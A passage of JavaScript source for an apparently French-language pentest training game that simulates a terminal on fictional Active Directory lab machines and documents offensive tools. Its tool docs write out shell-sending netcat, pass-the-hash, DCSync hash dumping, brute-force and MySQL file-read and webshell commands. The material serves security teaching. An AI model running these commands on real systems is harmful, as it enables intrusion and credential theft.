  const isInvoke = cmd === 'invoke-mimikatz' || (cmd === 'invoke' && args[0]?.toLowerCase().includes('mimikatz'));
  if (exploitCmds.includes(cmd.toLowerCase()) || isInvoke) {
    if (phase < 2) return { output: '\x1b[31m[!] Énumère d\'abord l\'AD : net localgroup "Domain Admins"\x1b[0m', pedagogie: null, effect: null, xpBonus: 0, stateChanges: {} };
    if (phase >= 3) return { output: '\x1b[33m[Déjà fait]\x1b[0m NTDS.dit dumped. Lance : type C:\\flag.txt', pedagogie: null, effect: null, xpBonus: 0, stateChanges: {} };
    const pe = scenario.phase_exploit;
    return {
      output: [
        '\x1b[36m╔═══════════════════════════════════════╗\x1b[0m',
        '\x1b[36m║  PHASE 3 — DUMP DES CREDENTIALS       ║\x1b[0m',
        '\x1b[36m╚═══════════════════════════════════════╝\x1b[0m',
        '',
        ...pe.reveals.map(r => `\x1b[31m[+]\x1b[0m ${r}`),
        '',
        `\x1b[32m✓ +${pe.xp} XP\x1b[0m`,
        '\x1b[37m→ type C:\\flag.txt  pour capturer le flag final\x1b[0m',
      ].join('\n'),
      pedagogie: 'secretsdump.py (Impacket) extrait les hashes depuis NTDS.dit (base AD) + SYSTEM hive. Mimikatz/sekurlsa::logonpasswords lit les credentials en mémoire (LSASS). Golden Ticket : forger un ticket Kerberos avec le hash krbtgt, valide 10 ans sur tout le domaine.',
      effect: null, xpBonus: pe.xp,
      stateChanges: { machinePhase: 3, rootObtained: true }
    };
  }

  // Flag
  if (cmd === 'type' || cmd === 'cat') {
    const target = args[0] || '';
    const tLow = target.toLowerCase();

    // user.txt — flag utilisateur (svc_backup compromis via AS-REP Roasting)
    const isUserFlag = tLow.includes('user.txt');
    if (isUserFlag) {
      if (phase < 2) return { output: `\x1b[31mAccess is denied.\x1b[0m\nTu n\'as pas encore accès au compte svc_backup.`, pedagogie: null, effect: null, xpBonus: 0, stateChanges: {} };
      return {
        output: [
          `\x1b[33mC:\\Users\\svc_backup\\Desktop\\user.txt\x1b[0m`,
          '',
          `\x1b[32mCQ{4d_c0ntr0ll3r_pwn3d}\x1b[0m`,
          '',
          `\x1b[33m📚 Flag utilisateur : compte svc_backup compromis via AS-REP Roasting\x1b[0m`,
          `   svc_backup avait "Do not require Kerberos preauthentication" → hash cracké offline`,
          `   Droits : Backup Operators + Replicating Directory Changes (DCSync)`,
          '',
          `\x1b[36m💡 Tu as le flag user ! Maintenant récupère le flag root :\x1b[0m`,
          `   \x1b[36mtype C:\\Users\\Administrator\\Desktop\\root.txt\x1b[0m`,
        ].join('\n'),
        pedagogie: 'Le flag user.txt (niveau utilisateur) est la preuve d\'un accès initial à la machine sans privilèges administrateur. Ici svc_backup a des droits DCSync = déjà quasi-DA, mais le flag root.txt nécessite un shell Administrator complet.',
        effect: null, xpBonus: 20,
        stateChanges: {}
      };
    }

    // root.txt — flag root/DA (Administrator via Pass-the-Hash)
    const isRootFlag = tLow.includes('root.txt') || tLow.includes('flag') || tLow.includes('flag.txt');
    if (isRootFlag) {
      if (phase < 3) return { output: `\x1b[31mAccess is denied.\x1b[0m\nDumpe d\'abord les credentials : secretsdump ou mimikatz`, pedagogie: null, effect: null, xpBonus: 0, stateChanges: {} };
      return captureFlagAndFinish(machine, state, scenario);
    }

    if (tLow.includes('hosts') || target.includes('\\hosts')) {
      return { output: '192.168.1.1  firewall.corp.local\n192.168.1.10 web.corp.local\n192.168.1.20 mail.corp.local\n192.168.1.30 db.corp.local\n192.168.1.100 dc.corp.local', pedagogie: null, effect: null, xpBonus: 5, stateChanges: {} };
    }
    return { output: `The system cannot find the path specified: ${target}`, pedagogie: null, effect: null, xpBonus: 0, stateChanges: {} };
  }

  if (cmd === 'dir' || cmd === 'ls') {
    const pathArg = args[0] || '';
    const isSvcBackup = pathArg.toLowerCase().includes('svc_backup');

    if (isSvcBackup) {
      return {
        output: [
          ` Directory of C:\\Users\\svc_backup\\Desktop`,
          '',
          '01/15/2024  09:00 AM    <DIR>          .',
          '01/15/2024  09:00 AM    <DIR>          ..',
          '\x1b[33m01/15/2024  09:00 AM                32 user.txt\x1b[0m',
        ].join('\n'),
        pedagogie: null, effect: null, xpBonus: 5, stateChanges: {}
      };
    }

    return {
      output: [
        ` Directory of C:\\Users\\Administrator\\Desktop`,
        '',
        '01/15/2024  09:23 AM    <DIR>          .',
        '01/15/2024  09:23 AM    <DIR>          ..',
        '\x1b[31m01/15/2024  09:23 AM                32 root.txt\x1b[0m',
        '\x1b[33m01/15/2024  09:22 AM                32 flag.txt\x1b[0m',
        '01/10/2024  11:42 AM               847 NEXUS_Corp_Confidential.docx',
      ].join('\n'),
      pedagogie: null, effect: null, xpBonus: 5, stateChanges: {}
    };
  }

  if (cmd === 'scores' || cmd === 'scoreboard') {
    return { output: '', pedagogie: null, effect: { type: 'SHOW_SCORES' }, xpBonus: 0, stateChanges: {} };
  }

  return {
    output: `\x1b[31m'${cmd}' is not recognized as an internal or external command.\x1b[0m\nTape \x1b[33mhelp\x1b[0m pour les commandes disponibles.`,
    pedagogie: null, effect: null, xpBonus: 0, stateChanges: {}
  };
}

// ─── Capture du flag (partagé) ────────────────────────────────────────────────

function captureFlagAndFinish(machine, state, scenario) {
  const pp = scenario.phase_post;
  const alreadyPwned = state.pwnedMachines.includes(machine.id);
  const newPwned = alreadyPwned ? state.pwnedMachines : [...state.pwnedMachines, machine.id];
  const newUnlocked = [...new Set([...state.unlockedMachines, ...(pp.unlocksMachines || [])])];

  const unlockMsg = (pp.unlocksMachines || []).map(id => {
    const m = MACHINES.find(x => x.id === id);
    return m ? `\x1b[32m🔓 ${m.name} (${m.ip}) — débloqué !\x1b[0m` : '';
  }).filter(Boolean);

  return {
    output: [
      '\x1b[32m╔══════════════════════════════════════════╗\x1b[0m',
      '\x1b[32m║          🚩 FLAG CAPTURÉ !               ║\x1b[0m',
      '\x1b[32m╚══════════════════════════════════════════╝\x1b[0m',
      '',
      `\x1b[33m${pp.flag}\x1b[0m`,
      '',
      ...pp.reveals.slice(-2).map(r => r),
      '',
      `\x1b[36m+${pp.xp} XP — ${machine.name} compromise !\x1b[0m`,
      ...(unlockMsg.length ? ['', ...unlockMsg] : []),
      '',
      '\x1b[37mTape "exit" pour revenir au réseau et continuer.\x1b[0m',
      '',
      pp.gameWin
        ? '\x1b[35mORACLE > C\'est terminé. Les preuves sont entre les mains des journalistes.\x1b[0m\n\x1b[35mORACLE > NEXUS Corp ne s\'en remettra pas.\x1b[0m\n\x1b[32m🏆 CYBERQUEST COMPLÉTÉ !\x1b[0m'
        : `\x1b[35mORACLE > ${machine.name} compromise. Il reste des cibles.\x1b[0m`,
    ].filter(s => s !== '').join('\n'),
    pedagogie: 'En CTF : le flag prouve la compromission. En pentest réel : on documente chaque étape avec des screenshots, commandes et outputs → rapport d\'audit avec niveau de criticité (CVSS) et recommandations.',
    effect: { type: 'FLAG_FOUND', machineId: machine.id, flag: pp.flag, gameWin: !!pp.gameWin },
    xpBonus: pp.xp,
    stateChanges: {
      pwnedMachines: newPwned,
      unlockedMachines: newUnlocked,
      machinePhase: 4,
      ...(pp.gameWin ? { gameWon: true } : {})
    }
  };
}

// ─── Machine mode dispatcher ──────────────────────────────────────────────────

function handleMachine(cmd, args, state) {
  const machine = state.currentMachine;
  if (!machine) return { output: 'Erreur: aucune machine active.', pedagogie: null, effect: null, xpBonus: 0, stateChanges: {} };

  if (machine.id === 'dbserver') return handleDBMachine(cmd, args, state, machine);
  if (machine.id === 'dc')       return handleDCMachine(cmd, args, state, machine);
  return handleLinuxMachine(cmd, args, state, machine);
}

// ─── Tool documentation (cmd?) ────────────────────────────────────────────────

const H = '\x1b[33m'; // header yellow
const C = '\x1b[36m'; // cyan (commands)
const G = '\x1b[32m'; // green (good)
const R = '\x1b[31m'; // red (warning)
const D = '\x1b[90m'; // dim grey
const X = '\x1b[0m';  // reset

const TOOL_DOCS = {
  nmap: {
    cat: 'Reconnaissance',
    desc: 'Scanner réseau — découverte d\'hôtes, ports ouverts, versions de services, OS.',
    context: 'Étape 1 du TD. Révèle 14 ports ouverts sur 192.168.1.10 (88=Kerberos, 389=LDAP, 445=SMB, 3268=GC-LDAP...). Les scripts NSE (-sC) découvrent automatiquement le FQDN dc.corp.local et confirment que SMB Signing est REQUIRED → NTLM Relay impossible.',
    syntax: [
      `${C}nmap <réseau/ip>${X}                    Ping scan`,
      `${C}nmap -sV <ip>${X}                       Détection de versions`,
      `${C}nmap -sC -sV -p- <ip>${X}               Scan complet (tous ports + scripts NSE)`,
      `${C}nmap -sC -sV -p- -oN scan.txt <ip>${X}  Idem + sauvegarde résultats`,
      `${C}nmap -sn 192.168.1.0/24${X}             Scan d\'hôtes actifs (pas de ports)`,
    ],
    examples: [
      `nmap 192.168.1.0/24          ${D}→ carte du réseau complet${X}`,
      `nmap -sV 192.168.1.10        ${D}→ services + versions de l\'AD${X}`,
      `nmap -sC -sV -p- 192.168.1.10 ${D}→ scan NSE : révèle corp.local, FQDN, SMB signing${X}`,
    ],
    breakdown: {
      cmd: 'nmap -sC -sV -p- 192.168.1.10',
      parts: [
        { token: 'nmap',           desc: 'Network Mapper — le scanner réseau de référence' },
        { token: '-sC',            desc: 'Script scan : active les scripts NSE par défaut (smb-os-discovery → révèle le domaine AD, le FQDN, SMB signing)' },
        { token: '-sV',            desc: 'Version detection : identifie les versions exactes des services (ex: Microsoft Windows Kerberos, IIS 10.0...)' },
        { token: '-p-',            desc: 'Port range : scanne les 65535 ports TCP (vs -p 1-1000 par défaut — évite de rater les services non-standard)' },
        { token: '192.168.1.10',   desc: 'IP cible : le Domain Controller corp.local dans ce lab' },
      ],
    },
    tips: [
      `-p- scanne les 65535 ports (lent mais complet — 20-30 min en réel)`,
      `-sC active les scripts NSE : smb-os-discovery révèle le domaine AD sans auth`,
      `Ports 88+389+3268 sur une cible = signature Domain Controller Active Directory`,
      `SMB Signing required dans les scripts NSE = NTLM Relay bloqué`,
    ],
  },
  dnsrecon: {
    cat: 'Reconnaissance AD',
    desc: 'Énumération DNS d\'un domaine Active Directory — enregistrements SOA, NS, A, SRV.',
    context: 'Étape 2 du TD. Révèle les SRV records Kerberos (_kerberos._tcp.corp.local → 192.168.1.10:88) et LDAP (_ldap._tcp.corp.local → 389). Confirme que la machine est bien un DC sans aucune authentification. La zone transfer (AXFR) est refusée → bonne configuration.',
    syntax: [
      `${C}dnsrecon -d <domaine> -n <ip-dc> -t std${X}   Énumération standard`,
      `${C}dnsrecon -d <domaine> -n <ip-dc> -t axfr${X}  Tentative de zone transfer`,
      `${C}dnsrecon -d <domaine> -n <ip-dc> -t all${X}   Tous les types de records`,
    ],
    examples: [
      `dnsrecon -d corp.local -n 192.168.1.10 -t std`,
    ],
    breakdown: {
      cmd: 'dnsrecon -d corp.local -n 192.168.1.10 -t std',
      parts: [
        { token: 'dnsrecon',       desc: 'Outil d\'énumération DNS — plus complet que dig pour l\'AD' },
        { token: '-d corp.local',  desc: 'Domain : le domaine Active Directory à énumérer (trouvé avec nmap -sC)' },
        { token: '-n 192.168.1.10',desc: 'Nameserver : adresse IP du serveur DNS à interroger (= le DC lui-même)' },
        { token: '-t std',         desc: 'Type : scan standard — interroge SOA, NS, A, AAAA, MX, SRV records' },
      ],
    },
    tips: [
      `Les SRV records révèlent Kerberos (_kerberos._tcp:88) et LDAP (_ldap._tcp:389)`,
      `Zone Transfer AXFR REFUSED = bonne config. Si réussi → tous les hôtes internes exposés`,
      `Toujours faire dnsrecon après nmap -sC : confirme le domaine AD sans authentification`,
    ],
  },
  nc: {
    cat: 'Exploitation — Reverse Shell',
    desc: 'Netcat — couteau suisse réseau. Ouvre des connexions TCP/UDP. En pentest : listener pour reverse shell.',
    syntax: [
      `${C}nc -lvnp <port>${X}           Listener TCP (attend une connexion entrante)`,
      `${C}nc -lnvp <port>${X}           Identique (ordre des flags différent)`,
      `${C}nc <ip> <port>${X}            Connexion vers une IP:port`,
      `${C}nc -e /bin/bash <ip> <port>${X} Bind shell (envoie un bash)`,
    ],
    examples: [
      `nc -lvnp 4444   ${D}→ ouvre le listener AVANT de lancer l\'exploit${X}`,
    ],
    tips: [
      `-l = listen, -v = verbose, -n = no DNS, -p = port`,
      `Lance TOUJOURS nc -lvnp avant de lancer l\'exploit — l\'ordre compte`,
      `Le reverse shell contourne les firewalls : la victime se connecte VERS toi (sortant), pas l\'inverse`,
      `Pour stabiliser un shell instable : python3 -c "import pty;pty.spawn('/bin/bash')"`,
    ],
  },
  python3: {
    cat: 'Exploitation',
    desc: 'Interpréteur Python 3. En pentest : lancer des exploits, stabiliser des shells, scripting.',
    syntax: [
      `${C}python3 <exploit.py> <ip> <port>${X}   Lancer un exploit`,
      `${C}python3 -c "import pty;pty.spawn('/bin/bash')"${X}  Stabiliser un shell`,
      `${C}python3 -m http.server 8080${X}         Serveur HTTP pour transférer des fichiers`,
    ],
    examples: [
      `python3 cve-2021-41773.py 192.168.1.10 4444  ${D}→ CVE Apache Path Traversal + RCE${X}`,
    ],
    tips: [
      `Après un reverse shell : stabilise avec python3 -c "import pty;pty.spawn('/bin/bash')"`,
      `Puis : export TERM=xterm → Ctrl+Z → stty raw -echo; fg pour avoir un shell complet`,
    ],
  },
  nikto: {
    cat: 'Scanning Web',
    desc: 'Scanner de vulnérabilités web — teste +6700 vulnérabilités connues, répertoires sensibles, headers.',
    syntax: [
      `${C}nikto -h <ip>${X}                  Scan HTTP standard (port 80)`,
      `${C}nikto -h http://<ip>:<port>${X}    Scan sur port spécifique`,
      `${C}nikto -h <ip> -o out.txt${X}       Scan + sauvegarde résultats`,
    ],
    examples: [
      `nikto -h 192.168.1.10   ${D}→ détecte CVE-2021-41773, /backup/, /admin/${X}`,
    ],
    tips: [
      `Nikto est très bruyant — déclenche tous les IDS/WAF. Ne pas utiliser en mode furtif`,
      `Révèle : fichiers sensibles exposés, méthodes HTTP dangereuses (PUT/TRACE), versions vulnérables`,
      `Complémentaire de gobuster : nikto cherche des CVEs, gobuster cherche des chemins`,
    ],
  },
  hydra: {
    cat: 'Brute-Force',
    desc: 'Outil de brute-force en ligne — SSH, FTP, HTTP, SMB, RDP, MySQL et +50 protocoles.',
    syntax: [
      `${C}hydra -l <user> -P <wordlist> <ip> <protocole>${X}      Un user, liste de mdp`,
      `${C}hydra -L <userlist> -P <wordlist> <ip> <protocole>${X}  Liste de users + mdp`,
      `${C}hydra -l admin -P rockyou.txt <ip> ssh${X}              Brute-force SSH`,
      `${C}hydra -l admin -P rockyou.txt rdp://<ip> -t 4${X}       Brute-force RDP (lent)`,
    ],
    examples: [
      `hydra -l admin -P /usr/share/wordlists/rockyou.txt 192.168.1.20 ssh`,
    ],
    tips: [
      `-t = threads simultanés. RDP : max 4 threads (sinon lockout)`,
      `Pour Active Directory, préférer kerbrute : énumère sans générer de logs d\'échec`,
      `rockyou.txt = /usr/share/wordlists/rockyou.txt sur Kali (14 millions de mots de passe)`,
      `Résultat positif : [22][ssh] host: <ip>  login: admin   password: letmein`,
    ],
  },
  ssh: {
    cat: 'Accès Initial',
    desc: 'Secure Shell — connexion chiffrée distante. Après brute-force SSH, accès complet au serveur.',
    syntax: [
      `${C}ssh <user>@<ip>${X}                    Connexion standard`,
      `${C}ssh -i <clé.pem> <user>@<ip>${X}       Connexion avec clé privée`,
      `${C}ssh -L 3306:192.168.1.30:3306 <user>@<ip>${X}  Tunnel SSH (port forwarding)`,
    ],
    examples: [
      `ssh admin@192.168.1.20   ${D}→ connexion après hydra (admin:letmein)${X}`,
    ],
    tips: [
      `Après connexion : vérifie ton identité avec id et whoami`,
      `Tunnel SSH pour atteindre le DB Server interne : ssh -L 3306:192.168.1.30:3306 admin@192.168.1.20`,
      `Cherche des clés privées dans ~/.ssh/ et /home/*/.ssh/ pour pivoter`,
    ],
  },
  enum4linux: {
    cat: 'Reconnaissance AD',
    desc: 'Énumération SMB/NetBIOS d\'un Active Directory — users, groupes, SID, politique de mots de passe.',
    syntax: [
      `${C}enum4linux -a <ip>${X}                 Énumération complète`,
      `${C}enum4linux -U <ip>${X}                 Users uniquement`,
      `${C}enum4linux -G <ip>${X}                 Groupes uniquement`,
      `${C}enum4linux -S <ip>${X}                 Partages SMB`,
    ],
    examples: [
      `enum4linux -a 192.168.1.10   ${D}→ révèle Administrator, Guest, krbtgt, svc_backup${X}`,
    ],
    tips: [
      `Révèle les users via RID cycling (bruteforce des SIDs) sans credentials`,
      `Les users trouvés servent ensuite pour kerbrute et impacket-GetNPUsers`,
      `Cherche les groupes : Domain Admins, Schema Admins = comptes à haute valeur`,
      `Nécessite que SMB soit accessible (port 445 ouvert et RPC fonctionnel)`,
    ],
  },
  kerbrute: {
    cat: 'Reconnaissance Kerberos',
    desc: 'Énumération de comptes Kerberos valides — sans mot de passe et sans générer de logs d\'échec.',
    context: 'Étape 11 du TD (après hydra RDP qui échoue). Valide les 6 comptes trouvés par enum4linux en les testant via Kerberos. Avantage clé : aucun event 4625 (Logon Failure) dans les logs Windows. Le résultat confirme svc_backup comme cible pour l\'AS-REP Roasting.',
    syntax: [
      `${C}kerbrute userenum --dc <ip> -d <domaine> <wordlist>${X}`,
      `${C}kerbrute passwordspray --dc <ip> -d <domaine> <wordlist> <password>${X}`,
      `${C}kerbrute bruteuser --dc <ip> -d <domaine> <user> <wordlist>${X}`,
    ],
    examples: [
      `kerbrute userenum --dc 192.168.1.10 -d corp.local /usr/share/seclists/Usernames/Names/names.txt`,
    ],
    breakdown: {
      cmd: 'kerbrute userenum --dc 192.168.1.10 -d corp.local userlist.txt',
      parts: [
        { token: 'kerbrute',         desc: 'Outil d\'énumération Kerberos — exploite le protocole AS-REQ pour valider des comptes' },
        { token: 'userenum',         desc: 'Mode : username enumeration — envoie des AS-REQ pour chaque username et analyse la réponse du KDC' },
        { token: '--dc 192.168.1.10',desc: 'Domain Controller : IP du KDC (Kerberos Key Distribution Center) à interroger, port 88' },
        { token: '-d corp.local',    desc: 'Domain : le domaine Kerberos (le même que l\'AD, découvert avec nmap -sC)' },
        { token: 'userlist.txt',     desc: 'Fichier de noms d\'utilisateurs à tester (obtenus depuis enum4linux)' },
      ],
    },
    tips: [
      `Avantage vs hydra : les échecs Kerberos ne génèrent pas d\'event 4625 (logon failure) dans les logs`,
      `Utilise les KRB5 AS-REQ pré-authentification pour valider les noms d\'utilisateurs`,
      `Les comptes valides retournés sont ensuite utilisés avec impacket-GetNPUsers pour l\'AS-REP Roasting`,
      `Wordlists : /usr/share/seclists/Usernames/ ou générer avec username-anarchy`,
    ],
  },
  mysql: {
    cat: 'Pivot — Base de données',
    desc: 'Client MySQL en ligne de commande — accès direct à la base de données après pivot.',
    syntax: [
      `${C}mysql -h <ip> -u <user> -p<pass>${X}            Connexion`,
      `${C}mysql -h <ip> -u <user> -p<pass> <db>${X}       Connexion + sélection DB`,
      `${C}show databases;${X}                              Lister les BDDs`,
      `${C}use <db>; show tables; select * from users;${X}  Requêtes SQL`,
    ],
    examples: [
      `mysql -h 192.168.1.30 -u db_user -pStr0ngP@ss  ${D}→ accès DB Server${X}`,
    ],
    tips: [
      `Pas d\'espace entre -p et le mot de passe : -pStr0ngP@ss (pas -p Str0ngP@ss)`,
      `FILE privilege : SELECT LOAD_FILE('/etc/shadow') → lecture de fichiers système`,
      `INTO OUTFILE : écrire des fichiers sur le serveur (webshell possible)`,
      `Cherche : credentials d\'autres services, hashes NTLM, données utilisateurs`,
    ],
  },
  'evil-winrm': {
    cat: 'Accès — Windows',
    desc: 'evil-winrm est un client WinRM (Windows Remote Management) conçu pour le\npenetration testing. WinRM est le service de gestion à distance de Windows,\nautilisé normalement par les administrateurs — il écoute sur le port 5985 (HTTP)\nou 5986 (HTTPS) et donne un shell PowerShell complet. evil-winrm supporte\nle Pass-the-Hash : Windows authentifie les connexions WinRM via NTLM, et le\nprotocole NTLM accepte un hash directement à la place du mot de passe. On\nn\'a donc jamais besoin de connaître le mot de passe en clair.',
    context: 'Dans ce TD (étape 17), on utilise le hash NTLM de Administrator extrait\npar impacket-secretsdump (5f4dcc3b5aa765d61d8327deb882cf99) pour s\'authentifier\ndirectement sur le Domain Controller 192.168.1.100 sans connaître le mot de\npasse en clair. Le shell PowerShell obtenu a les privilèges Domain Admin complets.\nC\'est à ce stade qu\'on peut exécuter whoami /all, bloodhound, secretsdump\nen mode machine, et finalement récupérer les flags root.txt et user.txt.',
    syntax: [
      `${C}evil-winrm -i <ip> -u <user> -p <password>${X}         Connexion classique`,
      `${C}evil-winrm -i <ip> -u <user> -H <ntlm_hash>${X}        Pass-the-Hash`,
      `${C}evil-winrm -i <ip> -u <user> -k -r <domain>${X}         Pass-the-Ticket`,
    ],
    examples: [
      `evil-winrm -i 192.168.1.100 -u Administrator -H 5f4dcc3b5aa765d61d8327deb882cf99`,
    ],
    breakdown: {
      cmd: 'evil-winrm -i 192.168.1.100 -u Administrator -H 5f4dcc3b5aa765d61d8327deb882cf99',
      parts: [
        { token: 'evil-winrm', desc: 'Le programme evil-winrm. Il se connecte au service WinRM de la\ncible (port 5985/TCP) et ouvre un shell PowerShell interactif.\nPar rapport à psexec, il est plus discret (pas de création de\nservice Windows) et plus pratique (autocomplétion, upload/download\nde fichiers intégrés). Il est pré-installé sur Kali Linux.' },
        { token: '-i 192.168.1.100', desc: '-i signifie "IP" ou "IP/hostname" — c\'est la cible. 192.168.1.100\nest l\'IP du Domain Controller (machine "dc" dans ce lab), débloquée\naprès avoir obtenu les hashes via secretsdump. WinRM doit être\nactivé sur la cible (vérifié avec nmap : port 5985 ouvert, visible\ndans le scan initial de l\'AD).' },
        { token: '-u Administrator', desc: '-u spécifie le nom d\'utilisateur. "Administrator" est le compte\nDomain Admin par défaut de tout domaine Active Directory. Son SID\nest toujours S-1-5-21-...-500. Son hash NTLM a été extrait depuis\nNTDS.dit via DCSync avec secretsdump. En Pass-the-Hash, le nom\nd\'utilisateur doit correspondre exactement au compte du hash.' },
        { token: '-H 5f4dcc3b5aa765d61d8327deb882cf99', desc: '-H spécifie le hash NTLM à utiliser pour le Pass-the-Hash.\nLe hash NTLM est la version hashée du mot de passe Windows\n(MD4 du mot de passe en UTF-16LE). Le protocole NTLM utilise\nce hash directement pour les calculs d\'authentification — il ne\nconnaît pas le mot de passe en clair, seulement le hash. evil-winrm\nfournit ce hash à la place du mot de passe → connexion acceptée\npar Windows sans jamais connaître "le vrai mot de passe".' },
      ],
    },
    tips: [
      `Pass-the-Hash : utilise le hash NTLM directement, sans connaître le mot de passe en clair`,
      `WinRM = port 5985 (HTTP) ou 5986 (HTTPS) — vérifié avec nmap avant`,
      `Après connexion : whoami /all pour voir les groupes et privilèges`,
      `Le hash NTLM se trouve dans secretsdump / mimikatz sur une machine compromise`,
    ],
  },
  searchsploit: {
    cat: 'Exploitation',
    desc: 'Recherche locale dans la base de données Exploit-DB — CVEs, PoCs, exploits publics.',
    syntax: [
      `${C}searchsploit <terme>${X}                   Recherche par mot-clé`,
      `${C}searchsploit -x <id>${X}                   Afficher le code de l\'exploit`,
      `${C}searchsploit -m <id>${X}                   Copier l\'exploit dans le dossier courant`,
      `${C}searchsploit apache 2.4.49${X}             Recherche ciblée`,
    ],
    examples: [
      `searchsploit apache 2.4.49   ${D}→ trouve CVE-2021-41773 (Path Traversal + RCE)${X}`,
      `searchsploit 41773           ${D}→ recherche directe par numéro CVE${X}`,
    ],
    tips: [
      `Après nmap -sV : note les versions des services, puis searchsploit <service> <version>`,
      `Exploit-DB contient +220 000 exploits. La majorité des CVEs connues y sont référencées`,
      `-m pour copier le PoC localement, puis python3 <exploit.py>`,
    ],
  },
  gobuster: {
    cat: 'Reconnaissance Web',
    desc: 'Brute-force de répertoires et fichiers web — plus rapide que dirb, supporte les extensions.',
    syntax: [
      `${C}gobuster dir -u http://<ip> -w <wordlist>${X}                           Répertoires`,
      `${C}gobuster dir -u http://<ip> -w <wordlist> -x php,txt,html${X}          Avec extensions`,
      `${C}gobuster dir -u http://<ip> -w <wordlist> -t 50 -o out.txt${X}         50 threads + sortie`,
    ],
    examples: [
      `gobuster dir -u http://192.168.1.10 -w /usr/share/wordlists/dirb/common.txt -x php,txt`,
    ],
    tips: [
      `Wordlists recommandées : dirb/common.txt (rapide), dirbuster/directory-list-2.3-medium.txt (complet)`,
      `Extensions utiles selon le serveur : .php .txt .html (Linux) / .asp .aspx .txt (Windows IIS)`,
      `feroxbuster est la version récursive de gobuster (explore chaque répertoire trouvé)`,
    ],
  },
  hashcat: {
    cat: 'Crack de hash',
    desc: 'hashcat est le cracker de hash le plus rapide disponible. Là où le CPU peut tester\nquelques millions de combinaisons par seconde, un GPU moderne peut en tester\nplusieurs milliards. Il supporte plus de 300 algorithmes différents : MD5, SHA,\nbcrypt, NTLM, Kerberos AS-REP/TGS, NTLMv2, et bien d\'autres. Le principe est\ntoujours le même : prendre chaque entrée d\'une wordlist, la hacher avec l\'algo\ncible, et comparer avec le hash à cracker. Si les deux correspondent → trouvé.',
    context: 'Dans ce TD (étape 13), hashcat craque le hash AS-REP de svc_backup récupéré\npar impacket-GetNPUsers. Ce hash ($krb5asrep$23$...) est un ticket Kerberos\nchiffré avec la clé du compte (dérivée de son mot de passe). L\'attaque est\n100% offline : aucune connexion vers le DC, zéro log généré, aucune détection\npossible. hashcat trouve ManagementPassword123 en quelques secondes car ce mot\nde passe figure dans rockyou.txt. Ce mot de passe sert ensuite pour\nnxc smb --shares (étape 14) et smbclient (étape 15).',
    syntax: [
      `${C}hashcat -m <mode> <hash> <wordlist>${X}                 Attaque dictionnaire`,
      `${C}hashcat -m <mode> <hash> <wordlist> -r rules.rule${X}  Avec règles de mutation`,
      `${C}hashcat -m 1000 hash.txt rockyou.txt${X}               Hash NTLM`,
      `${C}hashcat -m 18200 hash.txt rockyou.txt${X}              AS-REP Kerberos hash`,
      `${C}hashcat -m 13100 hash.txt rockyou.txt${X}              TGS-REP (Kerberoasting)`,
    ],
    examples: [
      `hashcat -m 18200 asrep_hash.txt /usr/share/wordlists/rockyou.txt  ${D}→ crack AS-REP${X}`,
      `hashcat -m 1000 ntlm.txt rockyou.txt  ${D}→ crack hash NTLM${X}`,
    ],
    breakdown: {
      cmd: 'hashcat -m 18200 asrep_hash.txt rockyou.txt --force',
      parts: [
        { token: 'hashcat', desc: 'Le programme hashcat lui-même. Il détecte automatiquement si un GPU\nest disponible et l\'utilise pour les calculs. En environnement de VM\nsans GPU dédié, il bascule sur le CPU (plus lent mais fonctionnel).\nSans options, il affiche l\'aide.' },
        { token: '-m 18200', desc: 'Le flag -m spécifie le mode, c\'est-à-dire l\'algorithme de hashage\nà utiliser pour les tentatives. Chaque type de hash a un numéro unique :\n18200 = Kerberos 5 AS-REP etype 23 (RC4-HMAC) → format $krb5asrep$23$\n1000  = NTLM pur (hashes Windows SAM/NTDS)\n5600  = NTLMv2 (hashes capturés par Responder)\n13100 = Kerberos TGS-REP etype 23 (Kerberoasting)\nSans -m correct, hashcat ne sait pas comment vérifier les tentatives.' },
        { token: 'asrep_hash.txt', desc: 'Le fichier contenant le hash AS-REP à cracker. Ce fichier contient\nla ligne complète copiée depuis la sortie de impacket-GetNPUsers :\n$krb5asrep$23$svc_backup@CORP.LOCAL:a3f8b2c1...\nLe hash est chiffré avec la clé du compte svc_backup (dérivée de son\nmot de passe). hashcat va tester chaque mot de passe jusqu\'à trouver\nlequel produit ce même hash quand hashé avec RC4-HMAC.' },
        { token: 'rockyou.txt', desc: 'La wordlist utilisée pour l\'attaque par dictionnaire. rockyou.txt\nest le dictionnaire de référence en sécurité offensive : il contient\n14,344,391 mots de passe réels issus de la fuite de données du site\nRockYou.com en 2009. Il inclut des mots de passe comme "password",\n"123456" mais aussi des combinaisons plus complexes comme\n"ManagementPassword123" qui suit un pattern prévisible (mot + action\n+ chiffres). Chemin complet : /usr/share/wordlists/rockyou.txt' },
        { token: '--force', desc: 'Ignore les avertissements que hashcat affiche au démarrage,\ngénéralement liés à l\'absence de GPU dédié, aux pilotes manquants,\nou à un environnement virtualisé. Sans --force, hashcat peut refuser\nde démarrer en VM. Ce flag n\'affecte pas la fiabilité des résultats,\nil force simplement l\'exécution malgré les conditions non-optimales.' },
      ],
    },
    tips: [
      `Mode 1000 = NTLM | 18200 = Kerberos AS-REP | 13100 = Kerberos TGS | 5600 = NTLMv2`,
      `--force : ignore les avertissements GPU (utile en VM sans GPU dédié)`,
      `Après crack : vérifier avec nxc smb <ip> -u <user> -p <password>`,
      `rockyou.txt = /usr/share/wordlists/rockyou.txt (14 millions de mots de passe communs)`,
    ],
  },
  secretsdump: {
    cat: 'Post-exploitation AD',
    desc: 'DCSync — vide tous les hashes du domaine AD (NTDS.dit) via le protocole de réplication.',
    syntax: [
      `${C}impacket-secretsdump <DOMAIN>/<user>:<pass>@<ip>${X}      Avec credentials`,
      `${C}impacket-secretsdump -H <ntlm> <DOMAIN>/<user>@<ip>${X}   Pass-the-Hash`,
      `${C}impacket-secretsdump -dc-ip <ip> <DOMAIN>/<user>:<pass>@<ip>${X}`,
    ],
    examples: [
      `impacket-secretsdump CORP/svc_backup:Password@192.168.1.100`,
      `impacket-secretsdump -dc-ip 192.168.1.100 CORP/Administrator:Pass@192.168.1.100`,
    ],
    tips: [
      `Nécessite un compte avec droits "Replicating Directory Changes" (DCSync privilege)`,
      `Retourne tous les hashes NTLM du domaine : Administrator, krbtgt, tous les users`,
      `Le hash krbtgt permet de créer un Golden Ticket (persistance 10 ans)`,
      `Le hash Administrator NTLM → evil-winrm Pass-the-Hash pour shell DC`,
    ],
  },
  dig: {
    cat: 'Reconnaissance DNS',
    desc: 'Outil DNS — interroge les serveurs DNS. En pentest : tentative de zone transfer (AXFR) pour obtenir tous les enregistrements internes.',
